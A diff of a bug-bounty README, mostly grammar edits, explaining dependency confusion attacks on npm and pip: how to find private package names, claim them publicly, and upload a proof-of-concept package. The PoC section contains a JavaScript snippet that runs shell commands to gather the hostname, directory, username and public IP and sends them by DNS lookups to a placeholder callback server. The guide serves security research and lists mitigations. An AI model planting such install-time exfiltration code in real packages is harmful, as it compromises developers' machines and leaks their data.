@@ -1,6 +1,6 @@
 # All About Dependency Confusion Attack, (Detecting, Finding, Mitigating)
 
-## Table of content:
+## Table of contents:
 
 - [About dependency confusion attack](#about-dependency-confusion-attack)
 - [How npm works and understanding package system, version, scope packages, etc.](#how-npm-and-similar-package-system-work-and-understanding-its-structure-and-more)
@@ -15,20 +15,20 @@
 
 
 ## About dependency confusion attack:
-When you put `pip install -r requirements.txt` in your terminal did you check the package that you currently installing is not in the public repository? Or did someone put a backdoor on this package that you install blindly? How do you trust pypi? Is there anything that can harm your machine which is protected by firewall? 
+When you put `pip install -r requirements.txt` in your terminal did you check the package that you currently installing is not in the public repository? Or did someone put a backdoor on this package that you installed blindly? How do you trust Pypi? Is there anything that can harm your machine which is protected by a firewall? 
 Well, you might wonder how you can easily get hacked for running this command in your terminal! I'm not going to explain how this occurs, there is a great article about [Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) by [alex birsan](https://twitter.com/alxbrsn)! But I can't resist giving you a simple explanation about the dependency confusion attack! 
-Suppose you had a project called `A` which completely depends on react packages as you might hear of some third-party react component packages that are currently used by lots of companies for their development process, (for example `react-router`) which means your current project heavily depends on some third-party module! Now Imagine you got a new job at this company and your previous colleague didn’t tell you about his project but did give you a file called `package.json` with a bunch of js files and you know what to do with that just simple command `npm -i` and You're good to go. But did you know that there might be some private packages that your senior developer didn’t allow you to disclose in public? So what will happen when you put `npm -i` in your terminal if this package is claimed by a malicious actor? Yeah, that's the simple explanation of dependency confusion attack!
+Suppose you had a project called `A` which completely depends on react packages as you might hear of some third-party react component packages that are currently used by lots of companies for their development process, (for example `react-router`) which means your current project heavily depends on some third-party module! Now Imagine you got a new job at this company and your previous colleague didn’t tell you about his project but did give you a file called `package.json` with a bunch of js files and you know what to do with that just simple command `npm -i` and You're good to go. But did you know that there might be some private packages that your senior developer didn’t allow you to disclose in public? So what will happen when you put `npm -i` in your terminal if a malicious actor claims this package? Yeah, that's the simple explanation of a dependency confusion attack!
 
 
 ## How npm and similar package system work and understanding its structure and more:
 
 npm stands for node package manager which is used for storing your project dependency as public. But npm also allows you to install packages from your local package manager which is private, which means these packages are restricted from public users, just an internal user or specific traffic can install these packages for development purposes! And also these packages didn’t exist in public npm [registry](https://registry.npmjs.com), this works fine until you accidentally forget to mention the install path in your cli file.
-but in pip, these are completely different as pip checks for higher versions if you put the `--extra-index` flag for your installation, like if you put `--extra-index` when you install pip packages through your terminal eg:`pip install -r requirements.txt --extra-index-url` then pip will first check which repository contains a higher version of this package. if pip sees that your local registry contains a higher version then pip will install this instead of a public one. Now imagine you accidentally leak your private pip package name Through github repo and attacker claim these packages and includes 2000.0.0 as the package version but in your local registry this package version is like 2.0.1 what will happen? well, pip priorities a higher version if you include the `--extra-index-url` flag so pip will install this package from a public instead of a private repository, as pip sees this version is higher than your local version. You can read how pip works in this blog [post](https://realpython.com/what-is-pip/), also if you want to read how the version work in npm please read this [article](https://stackoverflow.com/questions/22343224/whats-the-difference-between-tilde-and-caret-in-package-json).as my research is ongoing on other package system so I can't tell you enough for this! I will add them here.
+but in pip, these are completely different as pip checks for higher versions if you put the `--extra-index` flag for your installation, like if you put `--extra-index` when you install pip packages through your terminal eg:`pip install -r requirements.txt --extra-index-url` then pip will first check which repository contains a higher version of this package. if pip sees that your local registry contains a higher version, pip will install this instead of a public one. Now imagine you accidentally leak your private pip package name Through GitHub repo and the attacker claims these packages and includes 2000.0.0 as the package version but in your local registry this package version is like 2.0.1 what will happen? well, pip priorities a higher version if you include the `--extra-index-url` flag so pip will install this package from a public instead of a private repository, as pip sees this version is higher than your local version. You can read how pip works in this blog [post](https://realpython.com/what-is-pip/), also if you want to read how the version works in npm please read this [article](https://stackoverflow.com/questions/22343224/whats-the-difference-between-tilde-and-caret-in-package-json).as my research is ongoing on other package system so I can't tell you enough for this! I will add them here.
 
 
 ## Detect private pip and npm packages:
 
-This is so easy for npm normal packages, just visit `https://npmjs.com/package/YOUR-PACKAGE-NAME-HERE` and for scope packages, let me tell you what is exactly it means 'if you have seen an npm package name like this `@test/example-packages` that means every package are started with `@` and divided by `\` the first part of `\` is scopes name and the second part is actual packages name so if you found this type of package name in your finding, you have to check whether this scope name is claimed in a public repository or not, for that visit this `https://npmjs.com/org/SCOPE-NAMES-HERE` if this shows you 404 that's means this is unclaimed scope name! So for uploading POC packages on npmjs, you have to create an org name first then update this name to your package.json file like this `@org/package-name-here`, and for pip just [visit](https://pypi.org/)
+This is so easy for npm normal packages, visit `https://npmjs.com/package/YOUR-PACKAGE-NAME-HERE` and for scope packages, let me tell you what exactly it means 'if you have seen an npm package name like this `@test/example-packages` that means every package are started with `@` and divided by `\` the first part of `\` is scopes name and the second part is actual packages name so if you found this type of package name in your finding, you have to check whether this scope name is claimed in a public repository or not, for that visit this `https://npmjs.com/org/SCOPE-NAMES-HERE` if this shows you 404 that's means this is unclaimed scope name! So for uploading POC packages on npmjs, you have to create an org name first then update this name to your package.json file like this `@org/package-name-here`, and for pip just [visit](https://pypi.org/)
 
 
 
@@ -43,9 +43,9 @@ Download this `npm-automation.sh` file and run this command in your terminal `ba
 - Using Github:
 in GitHub you can visit every repo to see if there is any of these filenames exist, like for npm `package.json`,`yarn.lock`,`package-lock.json`,`yarn-error.log`. For pip `requirements.txt`, `requirement-dev.txt`,`requirement-prod.txt`. 
 - Using Devtools:
-open your firefox browser and visit your target domain/subdomain ==> right click ==> inspect ==> go to `Debugger` ==> try to find `Webpack` directory (if your target used webpack, otherwise you may not see anything) ==> in `Webpack` directory you will see `node_modules` folder and every subfolder name of `node_modules` folder is actually an npm package.
+open your Firefox browser and visit your target domain/subdomain ==> right click ==> inspect ==> go to `Debugger` ==> try to find `Webpack` directory (if your target used webpack, otherwise you may not see anything) ==> in `Webpack` directory you will see `node_modules` folder and every subfolder name of `node_modules` folder is an npm package.
 - JS file:
-js file is so boring to read, but if you already know what an npm package name looks like, you may able to spot them within js file. (this needs practice)
+js file is so boring to read, but if you already know what an npm package name looks like, you may able to spot them within the js file. (this needs practice)
 
 
 
@@ -59,7 +59,7 @@ follow these videos and repo
 ## Uploading POC:
 please follow this [video](https://youtu.be/GJSvEAJeqko) on my youtube channel.
 
-in this folder `src/poc`, edit `index.js` file. replace `niroborg-npm-com-test` with your target package name. also `bind9-or-callback-server.com` to your callback DNS server.
+in this folder `src/poc`, edit `index.js` file. replace `niroborg-npm-com-test` with your target package name. Also `bind9-or-callback-server.com` to your callback DNS server.
 ```javascript
 const { exec } = require("child_process");
 exec("a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $a.bind9-or-callback-server.com;done" , (error, data, getter) => {
@@ -98,7 +98,7 @@ and in `package.json` file, replace `test-npm-com-test` with your target package
 ## Mitigation:
 Scan your project dependency with [confused](https://github.com/visma-prodsec/confused) by [@visma-prodsec](https://github.com/visma-prodsec)
 
-(I have my own scanner just for npm, and I think [confused](https://github.com/visma-prodsec/confused) is really cool as they add a bunch of other package managers for scanning)
+(I have my scanner just for npm, and I think [confused](https://github.com/visma-prodsec/confused) is cool as they add a bunch of other package managers for scanning)
 ## Bounty Transparency:
 - $2000 from Shein (goes public)
 - $2000 from an outside bug bounty program (closed)
@@ -111,12 +111,12 @@ Scan your project dependency with [confused](https://github.com/visma-prodsec/co
 - $250 from Bugcrowd private program (closed)
 ## Shoutouts:
 - [@alxbrsn](https://twitter.com/alxbrsn) for his amazing [research](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) , without his research, nothing would have been possible.
-- [@Stok](https://twitter.com/stokfredrik) for his amazing [video](https://www.youtube.com/watch?v=p8wbebEgtDk) about setting-up bind9 dns server (using GoDaddy + aws)
+- [@Stok](https://twitter.com/stokfredrik) for his amazing [video](https://www.youtube.com/watch?v=p8wbebEgtDk) about setting-up bind9 DNS server (using GoDaddy + aws)
 - [@juxhindb](https://twitter.com/juxhindb) for his amazing github [repo](https://github.com/JuxhinDB/OOB-Server)
-- [@nigamelastic](https://twitter.com/nigamelastic) for his amazing [video](https://www.youtube.com/watch?v=iMSqT9MZbQs) about setting-up bind9 dns server(using Namecheap + digitalocean)
+- [@nigamelastic](https://twitter.com/nigamelastic) for his amazing [video](https://www.youtube.com/watch?v=iMSqT9MZbQs) about setting-up bind9 DNS server(using Namecheap + digital ocean)
 - [@tomnomnom](https://twitter.com/tomnomnom) for his powerful archive URL fetching tool [waybackurls](github.com/tomnomnom/waybackurls)
 - [@hacker_](https://twitter.com/hacker_) for his powerful archive URL fetching tool [gau](github.com/lc/gau)
-- [@visma-prodsec](https://github.com/visma-prodsec) for their powerfull dependency scanner [confused](https://github.com/visma-prodsec/confused)
+- [@visma-prodsec](https://github.com/visma-prodsec) for their powerful dependency scanner [confused](https://github.com/visma-prodsec/confused)
 
 ## Useful?
 
